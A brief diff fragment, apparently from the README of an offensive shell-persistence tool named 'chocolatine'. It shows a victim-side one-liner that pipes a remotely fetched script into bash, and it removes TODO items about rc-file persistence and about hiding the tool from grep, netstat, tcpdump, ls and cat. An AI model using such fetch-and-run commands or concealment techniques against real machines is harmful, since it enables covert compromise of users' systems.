@@ -32,7 +32,3 @@ Victim   : curl http://example.com/chocolatine.sh|bash
 
 ## TODO
  - :x: Fish Shell (~/.config/fish/config.fish)
- - :x: Hidding v1 (alias : grep -v $IP ,chocolatine )
- - :x: Hidding v2 (tcpdump , netstat, ls, cat (trick bad cat?), vim)
- - :x: File Exist : .bashrc, .zshrc
- - :x: Bug //croissant instead of /croissant
